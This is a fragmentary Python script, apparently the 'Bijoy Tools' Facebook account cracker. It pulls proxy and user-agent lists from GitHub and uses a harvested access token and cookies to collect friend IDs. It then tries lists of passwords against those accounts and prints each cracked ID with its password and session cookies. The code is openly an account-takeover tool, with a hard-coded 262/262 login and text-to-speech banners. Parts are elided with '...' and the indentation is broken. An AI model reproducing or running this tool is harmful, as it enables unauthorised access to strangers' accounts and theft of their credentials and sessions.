...
princp=[]
try:
	prox= requests.get('https://github.com/BIJOY-143/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mEnamul')
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/BIJOY-143/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
os.system('espeak -a 200 " Your, username and password"')
while attemps < 12345677901:
    username = input(' \033[0;92mEnter Username: ')
    password = input(' \033[0;93mEnter Password: ')

    if username == '262' and password == '262':
...
os.system('espeak -a 200 " Welcome,   to,  Bijoy  Tools"')
os.system('xdg-open https://t.me/Enamul262')
def banner():
	os.system("clear")
	print("""
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[1;91m\033[1;41m\033[1;97m              WELCOME BIJOY TOOLS                 \033[;0m\033[1;91m\033[1;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝

\x1b[1;96md8888b. d888888b    d88b  .d88b.  db    db 
\x1b[1;96m88  `8D   `88'      `8P' .8P  Y8. `8b  d8' 
\x1b[1;96m88oooY'    88        88  88    88  `8bd8'  
\x1b[1;96m88~~~b.    88        88  88    88    88    
\x1b[1;96m88   8D   .88.   db. 88  `8b  d8'    88    
...
\x1b[38;5;196m║  \x1b[1;96m𓆩💜𓆪𝐓𝐎𝐎𝐋𝐒 𝐕𝐄𝐑𝐒𝐈𝐎𝐍𓆩💜𓆪  \x1b[38;5;196m║ \x1b[1;96m𓆩❶.❶𓆪               \x1b[38;5;196m║
\x1b[38;5;196m╚════════════════════════╩══════════════════════╝""")            
os.system('espeak -a 100 " Your, File cloning and Addmin Contact Bijoy Chowdhury"')
def login():
	banner()
	Enamulj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	Enamulj('\033[0;97m===============================================')
	Enamul= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if Enamul in ['m']:
		public()
	elif Enamul in ['1']:
		crack_file()
...
def public():
	...
	for userr in uid:
		try:
			col = ses.get('https://m.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
...
def crack_file():
	os.system('clear')
	banner()
	os.system('espeak -a 200 " bijoy tools is your file name"')
...
os.system('espeak -a 100 " Bijoy,   Toosl Loging Successful"')
def setting():
	hu = '3'
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGIN BY BIJOY TOOLS\n\x1b[1;97m [1] METHOD [BIJOY IS ALWAYS KING] ')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
...
os.system('espeak -a 100 " Bijoy,   File Clone Start Now"') 						
def passwrd():
	os.system('clear')
	banner()
	...
	print('')
	Enamulj('==========================================')
	Enamulj('CLONING COMPLETE BIJOY TOOLS .......... ')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#Enamul-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•BIJOY-Cp] {idf} • {pw}')     
			  ...
			  #  open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
				...
				#Enamul-King
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•BIJOY-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;95m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " BIJOY,  Ok,  id"')
